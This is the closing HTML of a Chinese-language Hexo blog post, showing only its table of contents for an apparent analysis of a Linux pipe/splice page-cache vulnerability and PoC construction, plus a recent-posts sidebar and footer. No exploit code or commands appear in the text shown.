class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">一、文件读写背景知识</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E4%BC%A0%E7%BB%9FIO%E6%A8%A1%E5%BC%8F"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">1、传统IO模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%96%B0%E7%9A%84IO-%E9%9B%B6%E6%8B%B7%E8%B4%9D"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">2、新的IO 零拷贝</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#mmap%EF%BC%9A"><span class="toc-number">1.1.1.2.1.</span> <span class="toc-text">mmap：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sendfile%EF%BC%9A"><span class="toc-number">1.1.1.2.2.</span> <span class="toc-text">sendfile：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81pipe%E7%9B%B8%E5%85%B3%E7%9A%84%E7%BB%93%E6%9E%84%E4%B8%8E%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">二、pipe相关的结构与函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81pipe-write"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">1、pipe_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E9%9B%B6%E6%8B%B7%E8%B4%9D%E2%80%94%E2%80%94splice"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">2、零拷贝——splice()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81page-cache"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">3、page cache</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="toc-number">1.2.1.</span> <span class="toc-text">一、原理分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%BF%AD%E4%BB%A3%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">二、漏洞的迭代过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-poc%E6%9E%84%E9%80%A0"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 poc构造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">一、利用步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E9%80%89%E6%8B%A9"><span class="toc-number">1.3.2.</span> <span class="toc-text">二、文件选择</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UID"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">UID</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%EF%BC%9A"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">利用方式：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81poc"><span class="toc-number">1.3.3.</span> <span class="toc-text">三、poc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%98%E6%96%B9poc%EF%BC%9A"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">官方poc：</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/07/18/cve-2022-21907%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/" title="cve-2022-21907分析与复现">cve-2022-21907分析与复现</a><time datetime="2022-07-18T07:29:14.898Z" title="Created 2022-07-18 15:29:14">2022-07-18</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/06/25/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90/" title="常见加密算法逆向特征分析">常见加密算法逆向特征分析</a><time datetime="2022-06-25T12:58:00.209Z" title="Created 2022-06-25 20:58:00">2022-06-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/17/pwn_hctf2016-brop_writeup/" title="pwn_hctf2016-brop_writeup">pwn_hctf2016-brop_writeup</a><time datetime="2022-05-17T06:00:31.548Z" title="Created 2022-05-17 14:00:31">2022-05-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/14/pwn_%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" title="pwn_格式化字符串漏洞">pwn_格式化字符串漏洞</a><time datetime="2022-05-14T13:59:38.170Z" title="Created 2022-05-14 21:59:38">2022-05-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/10/ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="ROP学习笔记">ROP学习笔记</a><time datetime="2022-05-10T03:20:15.775Z" title="Created 2022-05-10 11:20:15">2022-05-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By lhl_2507</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>